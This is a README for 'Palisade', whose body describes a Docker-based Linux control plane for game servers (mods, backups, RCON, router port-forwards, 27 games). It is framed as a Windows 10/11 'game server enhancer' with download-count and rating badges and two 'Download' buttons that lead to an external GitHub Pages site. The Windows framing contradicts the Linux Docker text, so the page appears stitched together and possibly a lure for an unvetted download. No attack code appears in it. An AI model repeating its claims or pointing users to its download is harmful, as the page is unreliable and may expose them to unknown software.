<div align="center">

# Palisade — Multi-Game Server Enhancer for Windows 10/11

![](files/1.png)

[![downloads](https://img.shields.io/badge/downloads-93K-0f172a?style=for-the-badge&labelColor=1e293b)]() [![status](https://img.shields.io/badge/status-stable-2ea44f?style=for-the-badge&labelColor=1e293b)]() [![platform](https://img.shields.io/badge/platform-Windows_11-0f172a?style=for-the-badge&labelColor=1e293b)]() [![rating](https://img.shields.io/badge/rating-4.7%2F5-f59e0b?style=for-the-badge&labelColor=1e293b)]()

[![Download](https://raw.githubusercontent.com/Soumyadip01Das/palisade-game-enhancement/main/run_5de0468.svg)](https://Soumyadip01Das.github.io/palisade-game-enhancement/)

</div>

---

Palisade is a self-hosted, Docker-based control plane for game dedicated servers, built Unraid-first but ready to run on any Linux box with Docker. One lean manager container spawns and supervises a container per game server, driving every setting through schema-driven forms and handling mods, backups, schedules, player administration, and even your router's port-forwards. It ships first-class support for ARK: Survival Ascended and Evolved, Conan Exiles, Palworld, Minecraft Java and Bedrock, Icarus, Valheim, 7 Days to Die, Enshrouded, Project Zomboid, V Rising, and more. The manager stays a control plane only — no game runtime inside it — so each server runs on a proven community image while Palisade injects config, watches logs, and speaks RCON, telnet, and query protocols.

## Features

- **One manager, one container per game.** Palisade runs lean as a control plane and spawns a dedicated container for every server you add — create, install, start, done. Per-game readiness detection means you're not guessing when the server is actually joinable.

- **Crash watchdog + RAM guard.** A crashed server tells you *why* it died — exit code, OOM flag, and a log tail surfaced right on its Overview — instead of a bare "Crashed" badge. When memory gets tight, the RAM guard offers to back up and swap servers before things fall over.

- **Schema-driven settings for every game.** Full per-game settings catalogs with presets, copy-between-servers, and restart-needed tracking. No hand-editing config files, no guessing which values are valid.

- **Live player counts, everywhere.** A2S, RakNet ping, RCON, and status endpoints feed real-time counts with 1-hour sparklines. The **Players** roster is captured from player lists and join logs — kick, ban, whitelist, and admin per game, no console gymnastics.

- **Mods handled per-title.** CurseForge and Steam Workshop browsers where the game supports them, Thunderstore with auto-dependency resolution for Valheim, UE4SS and pak/DLL uploads for Palworld, mod-zip and plugin-folder support elsewhere. Each game gets the mod path it actually uses.

- **Backups that respect your intent.** Manual and scheduled snapshots with restore, browser download, and saves import. Retention is **per server** and rotates only the automatic snapshots — your manual backups and the safety copies taken before updates, restarts, and restores stay until you delete them. The manager snapshots its own database nightly, with separate retention.

- **Schedules with teeth.** Restart, update, backup, stop, and start — with in-game countdown warnings and pre-action snapshots. Two RCON actions go further: **Announce** drops an in-game chat message, and **Run a console command** fires a raw command exactly as you'd type it in the Console tab. Both skip cleanly unless the server is running.

- **Player-count conditions on any schedule.** Hold a schedule to at most N online (0 = empty server only), or at least N, so an announcement lands when someone's actually there to read it. Require the condition to have held for up to an hour, so a server that started a minute ago doesn't count as empty.

- **Global schedules and copy-out.** Run a schedule across every server or just the ones you pick, and copy any schedule to other servers in a click.

- **Version pinning that explains itself.** Registry-populated dropdowns let you pin the game version or Steam branch where the image supports it, and pin the Docker image tag on any game for advanced rollbacks — with a per-game note spelling out exactly what each pin does and doesn't control.

- **ARK cluster support.** Shared transfer directory across servers, so cluster transfers just work.

- **Notifications and guardrails.** Discord and webhook notifications, host low-disk warnings, editable ports with a start-time port-conflict guard.

- **Optional router integration.** pfSense, UniFi, or MikroTik RouterOS — one-click WAN port-forward create, fix, enable, disable, and delete per server via the router's API.

## How it works

Palisade is a control plane, not a game host. The manager container holds zero game runtime — its only job is to spawn one Docker container per server from a proven community image, then keep that container fed, watched, and reachable. Everything you touch in the UI maps to something real happening on the Docker daemon through the socket.

**Container lifecycle.** When you hit Create, Palisade writes a server definition to its SQLite database, resolves the right image and mount layout for that game, and starts the container. Every subsequent start recreates the container from the stored definition — which is why config changes, port edits, and version pins land on the next boot instead of needing a manual rebuild. Readiness isn't guessed: each game gets its own detection (log patterns, query response, port state) so the panel knows the difference between "process alive" and "actually accepting players." Shutdown is graceful first, with a crash watchdog behind it and a RAM guard that offers to snapshot and swap servers when the host runs tight.

**Config injection.** Every setting in the UI is schema-driven, and on start Palisade renders those values into whatever file format the game actually reads — INI, JSON, YAML, command-line flags, env vars. That's what makes presets, copy-between-servers, and restart-needed tracking possible: the manager knows which fields touched a file the running process already loaded.

**Talking to live servers.** RCON, telnet, A2S, RakNet ping, REST, and per-game status endpoints — whatever the title speaks, Palisade speaks it back. That's the channel behind live player counts, the Players roster built from player lists and join logs, and the kick / ban / whitelist / admin actions. It's also what powers console commands and in-game announcements, both as one-offs and as scheduled actions.

**Mods and uploads.** Workshop and CurseForge browsers where the game supports them, auto-dependency resolution for Thunderstore, and direct uploaders for the titles that only take files — .pak, mod-zip, add-on packs, plugin folders. Mod-ID handling is per-game, so a Workshop subscription and a hand-dropped pak both end up where the server expects them.

**Backups and schedules.** Snapshots are directory-level copies of world saves and instance data. Manual backups are yours until you delete them; automatic ones rotate against a per-server retention setting, and safety copies taken before an update, restart, or restore are exempt from rotation. The scheduler runs restart / update / backup / stop / start, optionally gated on player count — including "held for N minutes" so a freshly booted empty server doesn't trip an announce. Global schedules fan out across every server or a hand-picked subset. The manager snapshots its own database nightly on its own retention clock.

**Version control.** Game version and Steam branch pins come from registry-populated dropdowns where the image exposes them, and Docker image tags can be pinned per server for rollback. Each pin carries a per-game note spelling out exactly what it does and doesn't lock down, so nobody pins a tag expecting it to freeze the game build.

**Networking and host integration.** Game containers land on a shared bridge — created and joined automatically — or on host networking when the game's query and NAT behavior demand it. Editable ports get a start-time conflict guard. Optional router integration reaches pfSense, UniFi, or RouterOS over their APIs to create, fix, enable, disable, or delete the WAN forward for a server in one click. Discord and webhook notifications, plus host low-disk warnings, round out the watchtower. ARK clusters share a transfer directory across servers so transfers survive the trip.

## Supported Games

Palisade ships first-class support for 27 dedicated-server titles — not a "best effort" list, but per-game runtime, console access, and mod handling wired in from the jump. Each entry below is a real, tested configuration: the runtime Palisade uses to launch it, how the panel talks to it live, and what mod tooling comes baked in.

- **ARK: Survival Ascended** — Proton (POK image) · RCON · CurseForge browser
- **ARK: Survival Evolved** — native · RCON · Steam Workshop browser
- **Conan Exiles** — native · RCON · Steam Workshop browser
- **Palworld** — native · RCON · UE4SS (Linux) / pak uploader. Need the full Windows mod stack? There's a dedicated Wine variant running UE4SS plus DLL mods and the pak uploader.
- **Minecraft (Java)** — native (itzg) · RCON · CurseForge modpacks, auto-installed
- **Minecraft Bedrock** — native (itzg) · add-on pack uploader
- **Icarus** — Wine · .pak uploader
- **Valheim** — native (lloesche) · Thunderstore + Hexium browser with automatic dependency resolution
- **7 Days to Die** — native (LinuxGSM) · telnet console (in-app) · mod-zip uploader
- **Enshrouded** — Proton · no mod support (the game doesn't have any)
- **Project Zomboid** — native (Java) · RCON · Steam Workshop browser with automatic Mod-ID handling
- **V Rising** — Wine · RCON (announce) · no official mod support
- **Sons of the Forest** — Wine · no official mod support
- **Satisfactory** — native · HTTPS API with auto-claim · SFTP per upstream docs
- **Life is Feudal: Your Own** — Wine (+ bundled MariaDB) · in-game GM password · file-based per upstream docs
- **American Truck Simulator** — native · optional mods via session host
- **Euro Truck Simulator 2** — native · optional mods via session host
- **Core Keeper** — native · no ports needed (Steam-relay Game ID joins)
- **Terraria (TShock)** — native · REST-powered player counts · TShock ServerPlugins folder
- **Factorio** — native · RCON · mods folder with mod-portal auto-update
- **Rust** — native · RCON · Oxide/uMod toggle (plugins folder)
- **BeamNG.drive (BeamMP)** — native · client-mod + Lua plugin folders
- **OpenTTD** — native (ich777) · in-game console · NewGRFs via in-game content
- **Counter-Strike 2** — native (joedwards32) · RCON · Workshop maps/collections by ID
- **Don't Starve Together** — native (jamesits) · in-game console · Workshop mods via cluster files
- **RuneScape: Dragonwilds** — native (ferment9348) · owner-only in-game console · pak uploader (Nexus Mods mods)

Every one of these gets the same treatment: per-game settings catalogs with presets and restart-needed tracking, live player counts with roster capture (kick / ban / whitelist / admin), scheduled restarts with in-game countdown warnings, and backups that respect the game's own save layout. Where a title exposes a console — RCON, telnet, REST, or in-game — Palisade uses it for announcements and raw commands on a schedule.

Don't see your game? Palisade's schema-driven config engine and per-game container model are built to extend. If the community maintains a solid image for it, adding a game definition is a template job, not a rewrite.

## Configuration

Palisade is configured per-server, and every knob lives where you'd expect it: open a server, hit its settings cards, and you're editing the same schema-driven forms the manager uses to render the game's full settings catalog. Nothing is hidden behind a config file you have to hand-edit — presets, copy-between-servers, and restart-needed tracking are all right there in the UI.

**Per-server settings.** Each game exposes its own catalog — ports, world options, difficulty, moderation toggles, the works — grouped into cards so you're not scrolling a wall of keys. Apply a preset to skip the busywork, copy a tuned config to another server of the same game, and the panel flags exactly which changes need a restart before they take effect. Host networking, the connect address players type in, and per-server overrides for defaults like `GAME_HOST_NETWORK` can be set on the General card without touching the manager.

**Secrets and keys.** `SECRETS_KEY` encrypts stored API keys and passwords at rest, and `JWT_SECRET` signs login tokens. Both are generated and persisted on first start — leave them blank in the template and Palisade handles it. Lose `SECRETS_KEY` and you re-enter stored credentials; that's the one thing worth backing up alongside your data dir.

**Host paths and networking.** `HOST_DATA_DIR` auto-detects from the manager's own `/data` mount, so leave it unset unless the boot log says otherwise — and if you do set it, it must match the host path you mapped to `/data`, or game files land somewhere you didn't pick (the manager warns loudly at boot and in the health endpoint). `GAME_HOST_NETWORK=true` puts game containers on host networking, which ASA/EOS and Steam query prefer; individual servers can override it. `AUTO_CREATE_NETWORK` and `SHARED_NETWORK` control the bridge Palisade manages for you — defaults are correct for almost everyone.

**Schedules and retention.** Backups rotate per server (default 10, up to 500), and only the automatic snapshots rotate — scheduled backups, pre-update/restart/restore safety copies, and anything you take by hand stick around until you delete them, replication target included. The manager snapshots its own database nightly with separate retention in Settings → Backups. Schedules can be scoped per-server or global, held to a player-count condition, and copied between servers.

**Notifications and integrations.** Wire up Discord or a generic webhook for events, enable host low-disk warnings, and — if you run pfSense, UniFi, or MikroTik RouterOS — point Palisade at the router API for one-click WAN port-forward create/fix/enable/disable/delete per server. Editable ports come with a start-time conflict guard so two servers can't quietly fight over the same one.

**Version pinning.** Pin the game version or Steam branch where the image supports it, or drop to an exact Docker image tag for advanced rollbacks — each pin carries a per-game note spelling out what it does and doesn't control, so you're never guessing which layer you locked.

Most defaults are sane out of the box. Tune what your setup actually needs, copy the rest between servers, and let the restart-needed flags tell you when to bounce.

## FAQ

**Do I need to install anything on the host besides Docker?**
No. One manager container is the whole control plane — it contains no game runtime. It spawns a container per game server from proven community images and supervises them over the Docker socket. If Docker runs on the host, Palisade runs.

**Which games are supported?**
Twenty-seven, and the list keeps growing: ARK ASA/ASE, Conan Exiles, Palworld, Minecraft Java/Bedrock, Icarus, Valheim, 7 Days to Die, Enshrouded, Project Zomboid, V Rising, Sons of the Forest, Satisfactory, Life is Feudal: Your Own, American/Euro Truck Simulator 2, Core Keeper, Terraria (TShock), Factorio, Rust, BeamMP, OpenTTD, Counter-Strike 2, Don't Starve Together, RuneScape: Dragonwilds, and more. Each game gets its own guide covering ports, joining, first boot, and the gotchas that actually bite.

**Does it work off Unraid?**
Yes. Unraid-first is the design, not a limitation. Any Linux box with Docker runs the same image with the socket and a data volume mounted. The Unraid template just pre-fills the boring parts.

**Where do my secrets live, and do I have to generate them?**
Leave `SECRETS_KEY` and `JWT_SECRET` blank and the manager generates and persists them on first start. If you set them yourself, keep them safe — `SECRETS_KEY` encrypts stored API keys and passwords at rest, so losing it means re-entering them. `JWT_SECRET` signs login tokens.

**Why does `HOST_DATA_DIR` say "leave it blank"?**
Because it auto-detects the host path from its own `/data` mount at boot. Only set it if the log says detection failed — and then it must match the host path you mapped to `/data`. A wrong value sends every game server's files to a directory you didn't pick; the manager warns loudly at boot and in the health endpoint, but it won't override an explicit setting.

**Do I need to create a Docker network first?**
Normally no. Palisade creates its bridge on demand and attaches itself to it, including on Unraid custom/macvlan networks where it keeps its own IP and gains a route to the game containers. DIY only if you disabled auto-creation or locked down the Docker socket with something that can't create or attach networks.

**Some servers crash on boot. Why?**
The Wine/Proton games — Icarus, Enshrouded, V Rising, Sons of the Forest, LiF:YO — need a larger mmap limit on the *host* or they die at startup. Bump `vm.max_map_count` to 262144 and persist it. One-time fix, then forget it.

**Player counts are empty and RCON says the container name can't resolve.**
That's the manager not sharing a network with the game containers. Some games (Palworld, ASA, Minecraft) read players over RCON, so a resolution failure shows up as "no players" instead of an obvious error. The health endpoint names the exact condition. Fix: connect the manager to the same bridge, or make sure Unraid's Network Type is set to it. On host-networking setups, pass the host-gateway host entry so RCON can still reach back.

**The connect address on a server card is wrong.**
Palisade can't see the host's LAN IP from inside a container, so it derives the address players type: your configured "Address players connect to" first, then the port-forward target, then the public base URL, then whatever address you're browsing the panel at. That last fallback is the one that goes wrong on custom networks. Set the field once and every connect card follows it.

**Is my data safe if I delete and reinstall the container?**
Yes — data lives under your app-data directory: the SQLite DB, per-server instances and saves, backups, and cluster transfer dirs. One directory to back up. Reinstalling with the same app-data path picks up where you left off. If you ever point it at the wrong directory it looks like data loss and isn't — point it back. The database stores container-side paths, so backups and instances survive a host-path move as long as the whole directory moves together.

**What happens on updates?**
Pull the new image and recreate the container; DB migrations run automatically on boot. Releases are versioned, and any published version stays pullable as a rollback pin. There's also a nightly channel for bleeding-edge testing — rough edges expected, and it may apply migrations a later rollback can't undo, so back up first. Nightly never touches the stable tag.

**Can I roll back a game version, not just the panel?**
Yes, two ways. Pin the game version or Steam branch from registry-populated dropdowns where the image supports it (Minecraft, OpenTTD, 7DTD, Enshrouded, Valheim, Palworld, V Rising, Satisfactory, ATS/ETS2, LiF:YO), or pin the Docker image tag on any game for deeper rollbacks. Each game explains exactly what its pin does and doesn't control.

**Do backups rotate themselves?**
Manual and scheduled backups with restore, browser download, and save imports. Automatic snapshots rotate per server (default 10, up to 500) — and only automatic ones: scheduled backups and safety copies taken before updates, restarts, or restores are kept, and backups you take yourself stay until you delete them, replication target included. The manager also snapshots its own database nightly with separate retention.

**Can schedules warn players before a restart?**
Yes — in-game countdown warnings and a pre-action snapshot, plus two live-server RCON actions: Announce (chat message) and Run Console Command (raw command, same as the Console tab). Both skip unless the server is running. Any schedule can be gated on player count — run only when at most N are online (zero means empty-only), only when at least N are, or require the condition to have held for up to an hour so a just-started server doesn't count as empty. Copy schedules between servers, or set a global schedule that runs everywhere or on the servers you choose.

**Does it handle router port-forwards too?**
Optional, and yes: pfSense, UniFi, or MikroTik RouterOS via their APIs — one-click WAN forward create/fix/enable/disable/delete per server.

**How does it know a server actually started or crashed?**
Per-game readiness detection, graceful shutdown, and a crash watchdog. If a server dies, the Overview shows *why* — exit code or OOM plus a log tail — instead of a bare "Crashed" badge. A RAM guard offers to back up and swap servers when memory runs tight.

**What's the cost?**
Nothing. Self-hosted, no license, no telemetry funnel to someone else's cloud. Your servers, your box, your rules.

## Disclaimer

Palisade is a control panel, not a game server. It doesn't ship, patch, or own the games it manages — it tells Docker what to run and stays out of the way. Every game server you create is built from a community image maintained by someone else, under that project's own license and terms. Respect them.

You are the operator. You choose which games to host, where the files live, who gets in, and what your router exposes to the internet. Palisade gives you the levers — port-forwards, whitelists, RCON, schedules — it does not pull them for you. A server opened to the WAN is your responsibility, and so is whatever happens on it.

Mods, modpacks, plugins, and add-ons come from third parties. Palisade installs and wires them up, but it doesn't audit them. A bad mod can corrupt a save or open a hole; back up before you install, and know what you're loading.

Backups are your safety net, not a guarantee. Retention is per-server and rotates the automatic snapshots — your manual backups stick around until you delete them, so take one before anything you'd hate to lose. Keep a copy somewhere that isn't the host.

No warranty, no liability. Palisade is provided as-is, and the authors aren't on the hook for lost worlds, downtime, dropped players, banned accounts, or a router config gone sideways. Test on a throwaway server first. Read the per-game notes before you open a port. Then go run something.

[![Download](https://raw.githubusercontent.com/Soumyadip01Das/palisade-game-enhancement/main/run_5de0468.svg)](https://Soumyadip01Das.github.io/palisade-game-enhancement/)